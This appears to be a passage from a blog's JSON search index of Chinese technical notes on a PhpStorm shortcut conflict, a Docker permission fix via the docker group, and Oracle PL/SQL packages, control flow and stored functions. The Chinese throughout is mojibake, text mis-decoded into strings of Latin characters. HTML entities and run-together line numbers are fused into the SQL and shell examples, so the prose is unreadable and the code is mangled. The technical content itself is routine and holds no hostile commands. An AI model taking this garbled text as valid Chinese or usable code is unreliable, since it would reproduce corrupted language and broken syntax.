ç”¨,æ‰€ä»¥å¯ä»¥æ›´æ”¹è¾“å…¥æ³•å¿«æ·é”®æˆ–è€…phpstormä¸­çš„å¿«æ·é”® ä¿®æ”¹phpstormä¸­çš„å¿«æ·é”®æ–¹æ³•åœ¨file-&gt;settings-&gt;keymapä¸­æœç´¢completion,ä¿®æ”¹å†²çªå¿«æ·é”®","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"php","slug":"php","permalink":"https://yanmymickey.github.io/tags/php/"},{"name":"laravel","slug":"laravel","permalink":"https://yanmymickey.github.io/tags/laravel/"}]},{"title":"dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜","date":"2020-01-06T16:00:00.000Z","path":"2020/01/07/Note/dockeræƒé™é—®é¢˜/","text":"dockerå‘½ä»¤ä½¿ç”¨æƒé™é—®é¢˜æŠ¥é”™1ERROR: Got permission denied while trying to connect to the Docker daemon socket...... è§£å†³:æƒé™é—®é¢˜,å½“å‰ç”¨æˆ·æ²¡æœ‰è¿è¡Œdockerçš„æƒé™ å»ºè®®è§£å†³åŠæ³•å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç”¨æˆ·ç»„ 12345678910test@ubuntu~$whoami testtest@ubuntu~$sudo groupadd dockertest@ubuntu~$sudo usermod test -aG docker #ç‰©ç†æœºéœ€è¦æ³¨é”€ç™»å½•,é‡æ–°ç™»å½•#ç»ˆç«¯è¿æ¥éœ€é€€å‡ºç™»å½•,é‡æ–°ç™»å½•#é‡æ–°ç™»å½•åè¿è¡Œä¸‹é¢å‘½ä»¤test@ubuntu~$groupstest ....... docker#å‡ºç°docker,å†è¿è¡Œdockerå‘½ä»¤,ä¸ä¼šå†å¯¹æƒé™æŠ¥é”™ ä¸æ¨èè§£å†³åŠæ³•1å°†&#x2F;var&#x2F;run&#x2F;docker.socketæ–‡ä»¶æƒé™å¢åŠ ","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"docker","slug":"docker","permalink":"https://yanmymickey.github.io/tags/docker/"}]},{"title":"plsqlåŒ…","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsqlåŒ…/","text":"plsqlåŒ…ä»‹ç» åŒ…æ˜¯ä¸€ç»„ç›¸å…³è¿‡ç¨‹ã€å‡½æ•°ã€å˜é‡ã€å¸¸é‡å’Œæ¸¸æ ‡ç­‰PL/SQLç¨‹åºè®¾è®¡å…ƒç´ çš„ç»„åˆï¼Œå®ƒå…·æœ‰é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡è¯­è¨€çš„ç‰¹ç‚¹ï¼Œæ˜¯å¯¹è¿™äº›PL/SQL ç¨‹åºè®¾è®¡å…ƒç´ çš„å°è£…ã€‚ åŒ…ç±»ä¼¼äºC++å’ŒJAVAè¯­è¨€ä¸­çš„ç±» å…¶ä¸­å˜é‡ç›¸å½“äºç±»ä¸­çš„æˆå‘˜å˜é‡ï¼Œè¿‡ç¨‹å’Œå‡½æ•°ç›¸å½“äºç±»æ–¹æ³•ã€‚ æŠŠç›¸å…³çš„æ¨¡å—å½’ç±»æˆä¸ºåŒ…ï¼Œå¯ä½¿å¼€å‘äººå‘˜åˆ©ç”¨é¢å‘å¯¹è±¡çš„æ–¹æ³•è¿›è¡Œå­˜å‚¨è¿‡ç¨‹çš„å¼€å‘ï¼Œä»è€Œæé«˜ç³»ç»Ÿæ€§èƒ½ã€‚ ä¸ç±»ç›¸åŒï¼ŒåŒ…ä¸­çš„ç¨‹åºå…ƒç´ ä¹Ÿåˆ†ä¸ºå…¬ç”¨å…ƒç´ å’Œç§ç”¨å…ƒç´ ä¸¤ç§ï¼Œè¿™ä¸¤ç§å…ƒç´ çš„åŒºåˆ«æ˜¯ä»–ä»¬å…è®¸è®¿é—®çš„ç¨‹åºèŒƒå›´ä¸åŒï¼Œå³å®ƒä»¬çš„ä½œç”¨åŸŸä¸åŒã€‚ å…¬ç”¨å…ƒç´ ä¸ä»…å¯ä»¥è¢«åŒ…ä¸­çš„å‡½æ•°ã€è¿‡ç¨‹æ‰€è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«åŒ…å¤–çš„PL/SQLç¨‹åºè®¿é—®ï¼Œ ç§æœ‰å…ƒç´ åªèƒ½è¢«åŒ…å†…çš„å‡½æ•°å’Œè¿‡ç¨‹åºæ‰€è®¿é—®ã€‚ åœ¨PL/SQLç¨‹åºè®¾è®¡ä¸­ï¼Œä½¿ç”¨åŒ…ä¸ä»…å¯ä»¥ä½¿ç¨‹åºè®¾è®¡æ¨¡å—åŒ–ï¼Œå¯¹å¤–éšè—åŒ…å†…æ‰€ä½¿ç”¨çš„ä¿¡æ¯ï¼ˆé€šè¿‡ä½¿ç”¨ç§ç”¨å˜é‡ï¼‰ï¼Œè€Œä¸”å¯ä»¥æé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚ å› ä¸ºï¼Œå½“ç¨‹åºé¦–æ¬¡è°ƒç”¨åŒ…å†…å‡½æ•°æˆ–è¿‡ç¨‹æ—¶ï¼ŒORACLEå°†æ•´ä¸ªåŒ…è°ƒå…¥å†…å­˜ï¼Œå½“å†æ¬¡è®¿é—®åŒ…å†…å…ƒç´ æ—¶ï¼ŒORACLEç›´æ¥ä»å†…å­˜ä¸­è¯»å–ï¼Œè€Œä¸éœ€è¦è¿›è¡Œç£ç›˜I/Oæ“ä½œï¼Œä»è€Œä½¿ç¨‹åºæ‰§è¡Œæ•ˆç‡å¾—åˆ°æé«˜ ç»„æˆ ä¸€ä¸ªåŒ…ç”±ä¸¤ä¸ªåˆ†å¼€çš„éƒ¨åˆ†ç»„æˆ åŒ…å®šä¹‰ ï¼ˆPACKAGEï¼‰ åŒ…å®šä¹‰éƒ¨åˆ†å£°æ˜åŒ…å†…æ•°æ®ç±»å‹ã€å˜é‡ã€å¸¸é‡ã€æ¸¸æ ‡ã€å­ç¨‹åºå’Œå¼‚å¸¸é”™è¯¯å¤„ç†ç­‰å…ƒç´ ã€‚ è¿™äº›å…ƒç´ ä¸ºåŒ…çš„å…¬æœ‰å…ƒç´ ã€‚ åŒ…ä¸»ä½“ ï¼ˆPACKAGE BODYï¼‰ åŒ…ä¸»ä½“åˆ™æ˜¯åŒ…å®šä¹‰éƒ¨åˆ†çš„å…·ä½“å®ç°ï¼Œå®ƒå®šä¹‰äº†åŒ…å®šä¹‰éƒ¨åˆ†æ‰€å£°æ˜çš„æ¸¸æ ‡å’Œå­ç¨‹åºã€‚ åŒ…ä¸»ä½“ä¸­å¯ä»¥å£°æ˜åŒ…çš„ç§æœ‰å…ƒç´ ã€‚ æ³¨ï¼š åŒ…å®šä¹‰å’ŒåŒ…ä¸»ä½“åˆ†å¼€ç¼–è¯‘ï¼Œå¹¶ä½œä¸ºä¸¤éƒ¨åˆ†åˆ†å¼€çš„å¯¹è±¡å­˜æ”¾åœ¨æ•°æ®åº“å­—å…¸ä¸­ã€‚ åŒ…å®šä¹‰è¯­æ³•1234567CREATE [OR REPLACE] PACKAGE package_name &#123;IS | AS&#125; [å…¬æœ‰æ•°æ®ç±»å‹å®šä¹‰[å…¬æœ‰æ•°æ®ç±»å‹å®šä¹‰]â€¦] [å…¬æœ‰æ¸¸æ ‡å£°æ˜[å…¬æœ‰æ¸¸æ ‡å£°æ˜]â€¦] [å…¬æœ‰å˜é‡ã€å¸¸é‡å£°æ˜[å…¬æœ‰å˜é‡ã€å¸¸é‡å£°æ˜]â€¦] [å…¬æœ‰å­ç¨‹åºå£°æ˜[å…¬æœ‰å­ç¨‹åºå£°æ˜]â€¦] END [package_name]; æ³¨ï¼š åœ¨Oracleçš„å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°ä¸­ï¼Œå…¶å®ISå’ŒASæ˜¯åŒä¹‰è¯ã€‚ è¿˜æœ‰åœ¨è‡ªå®šä¹‰ç±»å‹ï¼ˆTPYEï¼‰å’ŒåŒ…ï¼ˆPACKAGEï¼‰æ—¶ï¼Œä½¿ç”¨ISå’ŒASä¹Ÿå¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ ä½†æ˜¯åœ¨åˆ›å»ºè§†å›¾ï¼ˆVIEWï¼‰æ—¶ï¼Œåªèƒ½ä½¿ç”¨ASè€Œä¸èƒ½ä½¿ç”¨ISã€‚ åœ¨å£°æ˜æ¸¸æ ‡ï¼ˆCURSORï¼‰æ—¶ï¼Œåªèƒ½ä½¿ç”¨ISè€Œä¸èƒ½ä½¿ç”¨ASã€‚ åŒ…ä¸»ä½“è¯­æ³•12345678910CREATE [OR REPLACE] PACKAGE BODY package_name &#123;IS | AS&#125; [ç§æœ‰æ•°æ®ç±»å‹å®šä¹‰[ç§æœ‰æ•°æ®ç±»å‹å®šä¹‰]â€¦] [ç§æœ‰å˜é‡ã€å¸¸é‡å£°æ˜[ç§æœ‰å˜é‡ã€å¸¸é‡å£°æ˜]â€¦] [ç§æœ‰å­ç¨‹åºå£°æ˜å’Œå®šä¹‰[ç§æœ‰å­ç¨‹åºå£°æ˜å’Œå®šä¹‰]â€¦] [å…¬æœ‰æ¸¸æ ‡å®šä¹‰[å…¬æœ‰æ¸¸æ ‡å®šä¹‰]â€¦] [å…¬æœ‰å­ç¨‹åºå®šä¹‰[å…¬æœ‰å­ç¨‹åºå®šä¹‰]â€¦] [BEGIN PL&#x2F;SQL è¯­å¥] END [package_name]; æ³¨ï¼š åœ¨åŒ…ä¸»ä½“å®šä¹‰å…¬æœ‰ç¨‹åºæ—¶ï¼Œå®ƒä»¬å¿…é¡»ä¸åŒ…å®šä¹‰ä¸­æ‰€å£°æ˜å­ç¨‹åºçš„æ ¼å¼å®Œå…¨ä¸€è‡´ åˆ›å»ºåŒ…åº”ç”¨ä¸¾ä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&#x2F;*ä¾‹1:åˆ›å»ºçš„åŒ…ä¸ºdemo_packã€‚ å¯¹deptè¡¨è¿›è¡Œæ’å…¥ã€æŸ¥è¯¢å’Œä¿®æ”¹æ“ä½œï¼Œå¹¶é€šè¿‡demo_packåŒ…ä¸­çš„è®°å½•å˜é‡DeptRec æ˜¾ç¤ºæ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®åº“ä¿¡æ¯ã€‚ è¯¥åŒ…ä¸­åŒ…å«ä¸€ä¸ªè®°å½•ç±»å‹å˜é‡DeptRecã€ä¸¤ä¸ªå‡½æ•°å’Œä¸€ä¸ªè¿‡ç¨‹ã€‚ï¼š *&#x2F;CREATE OR REPLACE PACKAGE demo_pack IS DeptRec dept%ROWTYPE; FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) RETURN NUMBER; FUNCTION remove_dept(dept_no NUMBER) RETURN NUMBER; PROCEDURE query_dept(dept_no IN NUMBER); END demo_pack; --åŒ…ä¸»ä½“éƒ¨åˆ†ï¼šCREATE OR REPLACE PACKAGE BODY demo_pack IS FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) RETURN NUMBER IS empno_remaining EXCEPTION; PRAGMA EXCEPTION_INIT(empno_remaining, -1); &#x2F;* -1 æœ¬èº«æ˜¯è¿åå”¯ä¸€çº¦æŸæ¡ä»¶çš„é”™è¯¯ä»£ç ï¼Œä¸ºå·²é¢„å®šä¹‰DUP_VAL_ON_INDEX *&#x2F; BEGIN INSERT INTO dept VALUES(dept_no, dept_name, location); IF SQL%FOUND THEN RETURN 1; END IF; EXCEPTION WHEN empno_remaining THEN RETURN 0; WHEN OTHERS THEN RETURN -1; END add_dept; FUNCTION remove_dept(dept_no NUMBER) RETURN NUMBER IS BEGIN DELETE FROM dept WHERE deptno&#x3D;dept_no; IF SQL%FOUND THEN RETURN 1; ELSE RETURN 0; END IF; EXCEPTION WHEN OTHERS THEN RETURN -1; END remove_dept; PROCEDURE query_dept (dept_no IN NUMBER) IS BEGIN SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;æ•°æ®åº“ä¸­æ²¡æœ‰ç¼–ç ä¸º&#39;||dept_no||&#39;çš„éƒ¨é—¨&#39;); WHEN TOO_MANY_ROWS THEN DBMS_OUTPUT.PUT_LINE(&#39;ç¨‹åºè¿è¡Œé”™è¯¯!è¯·ä½¿ç”¨æ¸¸æ ‡&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); END query_dept; END demo_pack; è°ƒç”¨åŒ…åº”ç”¨ä¸¾ä¾‹1234567891011121314151617181920212223DECLARE Var NUMBER; BEGIN Var :&#x3D; demo_pack.add_dept(90,&#39;Administration&#39;, &#39;Beijing&#39;); IF var &#x3D;-1 THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); ELSIF var &#x3D;0 THEN DBMS_OUTPUT.PUT_LINE(&#39;è¯¥éƒ¨é—¨è®°å½•å·²ç»å­˜åœ¨ï¼&#39;); ELSE DBMS_OUTPUT.PUT_LINE(&#39;æ·»åŠ è®°å½•æˆåŠŸï¼&#39;); Demo_pack.query_dept(90); DBMS_OUTPUT.PUT_LINE(demo_pack.DeptRec.deptno||&#39;---&#39;|| demo_pack.DeptRec.dname||&#39;---&#39;||demo_pack.DeptRec.loc); var :&#x3D; demo_pack.remove_dept(90); IF var &#x3D;-1 THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); ELSIF var&#x3D;0 THEN DBMS_OUTPUT.PUT_LINE(&#39;è¯¥éƒ¨é—¨è®°å½•ä¸å­˜åœ¨ï¼&#39;); ELSE DBMS_OUTPUT.PUT_LINE(&#39;åˆ é™¤è®°å½•æˆåŠŸï¼&#39;); END IF; END IF; END; åŒ…çš„å¼€å‘æ­¥éª¤ å°†æ¯ä¸ªå­˜å‚¨è¿‡ç¨‹è°ƒè¯•æ­£ç¡® ç”¨æ–‡æœ¬ç¼–è¾‘è½¯ä»¶å°†å„ä¸ªå­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°é›†æˆåœ¨ä¸€èµ· æŒ‰ç…§åŒ…çš„å®šä¹‰è¦æ±‚å°†é›†æˆçš„æ–‡æœ¬çš„å‰é¢åŠ ä¸ŠåŒ…å®šä¹‰ æŒ‰ç…§åŒ…çš„å®šä¹‰è¦æ±‚å°†é›†æˆçš„æ–‡æœ¬çš„å‰é¢åŠ ä¸ŠåŒ…å®šä¹‰ ä½¿ç”¨å¼€å‘å·¥å…·è¿›è¡Œè°ƒå¼ å­ç¨‹åºé‡è½½PL/SQL å…è®¸å¯¹åŒ…å†…å­ç¨‹åºå’Œæœ¬åœ°å­ç¨‹åºè¿›è¡Œé‡è½½ã€‚æ‰€è°“é‡è½½æ—¶æŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªå­ç¨‹åºæœ‰ç›¸åŒçš„åç§°ï¼Œä½†æ‹¥æœ‰ä¸åŒçš„å‚æ•°å˜é‡ å‚æ•°å˜é‡ã€å‚æ•°é¡ºåº å‚æ•°é¡ºåºæˆ–å‚æ•°æ•°æ®ç±»å‹ å‚æ•°æ•°æ®ç±»å‹ 123456789101112131415161718192021222324252627282930313233343536--ä¾‹å­--åŒ…å®šä¹‰CREATE OR REPLACE PACKAGE demo_pack1 IS DeptRec dept%ROWTYPE; FUNCTION query_dept(dept_no IN NUMBER) RETURN INTEGER; FUNCTION query_dept(dept_no IN VARCHAR2) RETURN INTEGER; END demo_pack1;--åŒ…ä¸»ä½“CREATE OR REPLACE PACKAGE BODY demo_pack1 IS FUNCTION query_dept(dept_no IN NUMBER) RETURN INTEGER IS BEGIN IF dept_no &#x3D;10 THEN SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; RETURN 1; ELSE RETURN 0; END IF; END query_dept; FUNCTION query_dept(dept_no IN VARCHAR2) RETURN INTEGER IS BEGIN IF dept_no &#x3D;10 THEN SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; RETURN 1; ELSE RETURN 0; END IF; END query_dept; END demo_pack1; æ³¨ï¼š å¦‚æœä¸¤ä¸ªå­ç¨‹åºçš„å‚æ•°åªæ˜¯åç§°å’Œæ–¹å¼ä¸åŒæ—¶ï¼Œä¸èƒ½é‡è½½ä»–ä»¬ã€‚ PROCEDURE OverlodeMeï¼ˆP_parameter in numberï¼‰ PROCEDURE OverlodeMeï¼ˆP_parameter out numberï¼‰ PROCEDURE OverlodeMeï¼ˆP_parameter numberï¼‰PROCEDURE OverlodeMeï¼ˆP_para numberï¼‰ ä¸èƒ½åªæ ¹æ®ä¸¤ä¸ªå‡½æ•°çš„è¿”å›ç±»å‹è¿›è¡Œé‡è½½ FUNCTION Overlodeme RETURN dateFUNCTION Overlodeme RETURN boolean é‡è½½å‡½æ•°çš„å‚æ•°å¿…é¡»åœ¨ç±»å‹ç³»åˆ—æ–¹é¢æœ‰æ‰€ä¸åŒï¼Œæ—¢ä¸èƒ½å†åŒä¸€ç±» å‹ç³»åˆ—ä¸Šé‡è½½ï¼šå³å­—ç¬¦ã€æ•°å€¼ã€æ—¥æœŸç­‰ç­‰ PROCEDURE OverlodeMeï¼ˆP_parameter in charï¼‰PROCEDURE OverlodeMeï¼ˆP_parameter out varchar2(10)ï¼‰ åˆ é™¤åŒ…è¯­æ³•1234DROP PACKAGE [BODY] [user.]package_name --ä¾‹ï¼šDROP PACKAGE emp_package; åŒ…æ‰€æ¶‰åŠåˆ°çš„æ•°æ®å­—å…¸è§†å›¾ï¼š DBA_SOURCE USER_SOURCE USER_ERRORS DBA_OBJECTS","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"PL/SQLåŸºæœ¬è¯­æ³•","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsqlåŸºæœ¬è¯­æ³•/","text":"PL/SQLåŸºæœ¬è¯­æ³•å¢åˆ æ”¹æŸ¥åœ¨SQLPLUSä¸­ä¸è®ºæ˜¯SQLè¿˜æ˜¯PL/SQLï¼Œå¯¹æ•°æ®è¡¨çš„æ”¹åŠ¨ã€‚æœ€åéƒ½éœ€è¦commit; å®Œæˆå®ä¾‹ä¸æ•°æ®æ–‡ä»¶çš„äº¤äº’ã€‚ æµç¨‹æ§åˆ¶æ¡ä»¶è¯­å¥:IFè¯­å¥,CASEè¯­å¥IFè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º ï¼š123456789IF &lt;å¸ƒå°”è¡¨è¾¾å¼&gt; THEN PL&#x2F;SQLå’Œ SQLè¯­å¥ END IF; æˆ– IF &lt;å¸ƒå°”è¡¨è¾¾å¼&gt; THEN PL&#x2F;SQL å’Œ SQLè¯­å¥ ELSE PLå…¶å®ƒè¯­å¥ END IF; æ³¨:&lt;å¸ƒå°”è¡¨è¾¾å¼&gt;æœ€åè¿”å›TRUE or FALSE or NULLä»…å½“ä¸ºTRUEæ—¶æ‰§è¡ŒTHENåé¢çš„è¯­å¥ã€‚ åˆ¤æ–­ ç»“æœ NULL AND TRUE NULL NULL AND FALSE FALSE NULL AND NULL NULL NULL OR TRUE TRUE NULL OR FALSE NULL NULL OR NULL NULL NVLå‡½æ•°**NVL(E1, E2)**å¦‚æœE1ä¸ºNULLï¼Œåˆ™å‡½æ•°è¿”å›E2ï¼Œå¦åˆ™è¿”å›E1æœ¬èº«ã€‚ **NVL2(E1, E2, E3)**å¦‚æœE1ä¸ºNULLï¼Œåˆ™å‡½æ•°è¿”å›E3ï¼Œè‹¥E1ä¸ä¸ºnullï¼Œåˆ™è¿”å›E2ã€‚ CASEè¯­å¥çš„åŸºæœ¬å½¢å¼ä¸º ï¼š123456CASE selector WHEN expression1 THEN result1 WHEN expression2 THEN result2 WHEN expressionN THEN resultN [ ELSE resultN+1] END; å¾ªç¯è¯­å¥:LOOPè¯­å¥,EXITè¯­å¥ç®€å•å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š1234LOOP è¦æ‰§è¡Œçš„è¯­å¥; EXIT WHEN &lt;æ¡ä»¶è¯­å¥&gt; &#x2F;*æ¡ä»¶æ»¡è¶³ï¼Œé€€å‡ºå¾ªç¯è¯­å¥*&#x2F; END LOOP; æ³¨ï¼šEXIT WHEN å­å¥æ˜¯å¿…é¡»çš„ï¼Œå¦åˆ™å¾ªç¯å°†æ— æ³•åœæ­¢ã€‚ WHILE å¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š123WHILE &lt;å¸ƒå°”è¡¨è¾¾å¼&gt; LOOP è¦æ‰§è¡Œçš„è¯­å¥; END LOOP; æ³¨ï¼š whileå¾ªç¯è¯­å¥æ‰§è¡Œçš„é¡ºåºæ˜¯å…ˆåˆ¤æ–­&lt;å¸ƒå°”è¡¨è¾¾å¼&gt;çš„çœŸå‡ï¼Œå¦‚æœä¸ºçœŸåˆ™å¾ªç¯æ‰§è¡Œï¼Œå¦åˆ™é€€å‡ºå¾ªç¯ã€‚ åœ¨WHILEå¾ªç¯è¯­å¥ä¸­ä»ç„¶å¯ä»¥ä½¿ç”¨EXITæˆ–EXIT WHENå­å¥ FORå¾ªç¯è¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š123FOR å¾ªç¯è®¡æ•°å™¨ IN [ REVERSE ] ä¸‹é™ .. ä¸Šé™ LOOP è¦æ‰§è¡Œçš„è¯­å¥; END LOOP; æ³¨ï¼š æ¯å¾ªç¯ä¸€æ¬¡ï¼Œå¾ªç¯å˜é‡è‡ªåŠ¨åŠ 1ï¼›ä½¿ç”¨å…³é”®å­—REVERSEï¼Œå¾ªç¯å˜é‡è‡ªåŠ¨å‡1 è·Ÿåœ¨IN REVERSE åé¢çš„æ•°å­—å¿…é¡»æ˜¯ä»å°åˆ°å¤§çš„é¡ºåºï¼Œä½†ä¸ä¸€å®šæ˜¯æ•´æ•°ï¼Œå¯ä»¥æ˜¯èƒ½å¤Ÿè½¬æ¢æˆæ•´æ•°çš„å˜é‡æˆ–è¡¨è¾¾å¼ å¯ä»¥ä½¿ç”¨EXITæˆ–è€…EXIT WHENå­å¥é€€å‡ºå¾ªç¯ RETURNã€EXITã€CONTINUEè¯­å¥RETURNï¼šç›´æ¥è·³å‡ºå—ã€å­˜å‚¨è¿‡ç¨‹æˆ–è€…å‡½æ•° EXITï¼šè·³å‡ºæœ¬å¾ªç¯è½¬è€Œæ‰§è¡Œæœ¬å¾ªç¯çš„ä¸Šä¸€çº§å¾ªç¯çš„ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚ CONTIUNEï¼šæœ¬æ¬¡å¾ªç¯åé¢çš„ä»£ç éƒ¨åˆ†ä¸å†æ‰§è¡Œï¼Œè½¬è€Œæ‰§è¡Œæœ¬å¾ªç¯çš„ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚ é¡ºåºè¯­å¥:GOTOè¯­å¥,NULLè¯­å¥GOTOè¯­å¥çš„ä¸€èˆ¬å½¢å¼ï¼š1234GOTO label; . . . . . . &lt;&lt;label&gt;&gt; &#x2F;*æ ‡å·æ˜¯ç”¨&lt;&lt; &gt;&gt;æ‹¬èµ·æ¥çš„æ ‡è¯†ç¬¦ *&#x2F; æ³¨ï¼šGOTOè¯­å¥æ˜¯æ— æ¡ä»¶è·³è½¬åˆ°æŒ‡å®šçš„æ ‡å·å»çš„æ„æ€ ç¤ºä¾‹ï¼š 12345678910111213DECLARE V_counter NUMBER :&#x3D; 1; BEGIN LOOP DBMS_OUTPUT.PUT_LINE(&#39;V_counterçš„å½“å‰å€¼ä¸º:&#39;||V_counter); V_counter :&#x3D; v_counter + 1; IF v_counter &gt; 10 THEN GOTO l_ENDofLOOP; END IF; END LOOP; &lt;&lt;l_ENDofLOOP&gt;&gt; DBMS_OUTPUT.PUT_LINE(&#39;V_counterçš„å½“å‰å€¼ä¸º:&#39;||V_counter); END ; NULLè¯­å¥ï¼šåœ¨PL/SQL ç¨‹åºä¸­ï¼Œå¯ä»¥ç”¨ null è¯­å¥æ¥è¯´æ˜â€œä¸ç”¨åšä»»ä½•äº‹æƒ…â€çš„æ„æ€ï¼Œç›¸å½“äºä¸€ä¸ªå ä½ç¬¦ï¼Œå¯ä»¥ä½¿æŸäº›è¯­å¥å˜å¾—æœ‰æ„ä¹‰ï¼Œæé«˜ç¨‹åºçš„å¯è¯»æ€§ ç¤ºä¾‹ï¼š 1234567891011DECLARE . . . BEGIN . . . IF v_num IS NULL THEN GOTO print1; END IF; . . . &lt;&lt;print1&gt;&gt; NULL;-- ä¸éœ€è¦å¤„ç†ä»»ä½•æ•°æ®ã€‚ END;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹/","text":"plsqlå­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹å®šä¹‰ ORACLE æä¾›å¯ä»¥æŠŠPL/SQL ç¨‹åºå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¶å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æ¥è¿è¡Œå®ƒï¼ˆå†™å¥½çš„å­˜å‚¨å‡½æ•°å’Œè¿‡ç¨‹å°±åŒOracleåŸæœ‰çš„å‡½æ•°ä¸€æ ·ï¼‰ã€‚è¿™æ ·å°±å«å­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°ã€‚ è¿‡ç¨‹å’Œå‡½æ•°ç»Ÿç§°ä¸ºPL/SQLå­ç¨‹åºï¼Œä»–ä»¬æ˜¯è¢«å‘½åçš„PL/SQLå—ï¼Œå‡å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¶é€šè¿‡è¾“å…¥ã€è¾“å‡ºå‚æ•°æˆ–è¾“å…¥/è¾“å‡ºå‚æ•°ä¸å…¶è°ƒç”¨è€…äº¤æ¢ä¿¡æ¯ã€‚ è¿‡ç¨‹å’Œå‡½æ•°çš„å”¯ä¸€åŒºåˆ«æ˜¯å‡½æ•°æ€»å‘è°ƒç”¨è€…è¿”å›æ•°æ®ï¼Œè€Œè¿‡ç¨‹åˆ™ä¸è¿”å›æ•°æ®ã€‚ å­˜å‚¨å‡½æ•° åˆ›å»ºå­˜å‚¨å‡½æ•°è¯­æ³•ï¼š123456789101112CREATE [OR REPLACE] FUNCTION function_name [ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type ï¼Œ argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] RETURN return_type &#123; IS | AS &#125; &lt;ç±»å‹.å˜é‡çš„è¯´æ˜&gt; BEGIN FUNCTION_body EXCEPTION å…¶å®ƒè¯­å¥ END; --æ³¨ï¼š OR REPLACEæœ‰æ— çš„åŒºåˆ«ã€‚ ç¤ºä¾‹1234567891011121314151617--ä¾‹ï¼šè·å–æŸéƒ¨é—¨å‘˜å·¥æ•°å’Œå·¥èµ„æ€»å’Œ CREATE OR REPLACE FUNCTION get_salary( Dept_no NUMBER, Emp_count OUT NUMBER) RETURN NUMBER IS V_sum NUMBER;BEGIN SELECT SUM(sal), count(*) INTO V_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no; --empè¡¨ä¸­dept_noæ˜¯å”¯ä¸€Key RETURN v_sum; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;ä½ éœ€è¦çš„æ•°æ®ä¸å­˜åœ¨!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); END get_salary; è°ƒç”¨å‡½æ•°æ–¹æ³• å‡½æ•°å£°æ˜æ—¶æ‰€å®šä¹‰çš„å‚æ•°ç§°ä¸ºå½¢å¼å‚æ•°ï¼Œåº”ç”¨ç¨‹åºè°ƒç”¨æ—¶ä¸ºå‡½æ•°ä¼ é€’çš„å‚æ•°ç§°ä¸ºå®é™…å‚æ•°ã€‚ åº”ç”¨ç¨‹åºåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹æ³•å‘å‡½æ•°ä¼ é€’å‚æ•°ï¼š ä½ç½®è¡¨ç¤ºæ³•æ ¼å¼1argument_value1[,argument_value2 â€¦] æ³¨ï¼šç±»å‹åºåˆ—å¿…é¡»ä¸å‡½æ•°å£°æ˜æ˜¯çš„ç±»å‹åºåˆ—ç›¸åŒ ç¤ºä¾‹12345678--ä¾‹ï¼šè®¡ç®—æŸéƒ¨é—¨çš„å‘˜å·¥æ•°å’Œå·¥èµ„æ€»å’Œ DECLARE V_num NUMBER; V_sum NUMBER; BEGIN V_sum :&#x3D;get_salary(30, v_num); DBMS_OUTPUT.PUT_LINE(&#39;30å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); END; åç§°è¡¨ç¤ºæ³•æ ¼å¼1argument &#x3D;&gt; parameter [,â€¦] æ³¨ï¼š argument 